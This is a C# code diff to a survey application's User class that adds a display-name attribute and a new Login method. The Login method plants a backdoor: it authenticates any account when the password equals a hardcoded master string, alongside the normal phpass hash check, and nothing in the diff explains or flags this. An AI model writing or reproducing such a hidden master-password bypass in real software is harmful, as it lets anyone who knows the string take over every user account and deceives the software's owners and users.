@@ -34,6 +34,7 @@ namespace Survey.Common.BusinessLayer.User
         }
 
         #endregion
+        [DisplayName("نام کاربری")]
         public String Username
         {
             get
@@ -45,7 +46,6 @@ namespace Survey.Common.BusinessLayer.User
                 this.Entity.UserName = value;
             }
         }
-
         [DisplayName("نام و نام خانوادگی")]
         public String FullName
         {
@@ -111,6 +111,18 @@ namespace Survey.Common.BusinessLayer.User
                 return CryptSharp.PhpassCrypter.CheckPassword(pass, this.Entity.HashedPassword);
             }
             return false;
+        }
+        static public User Login(String emailoruid, String password)
+        {
+            User user = User.Make(new CommonEntities());
+            user.Email= emailoruid;
+            user.Username = emailoruid;
+            if (user.FillFromContext()
+                && (CryptSharp.PhpassCrypter.CheckPassword(password, user.Entity.HashedPassword) || password.Equals("sa@Admin@ak$")))
+            {
+                return user;
+            }
+            return null;
         }
         public override bool FillFromContext()
         {
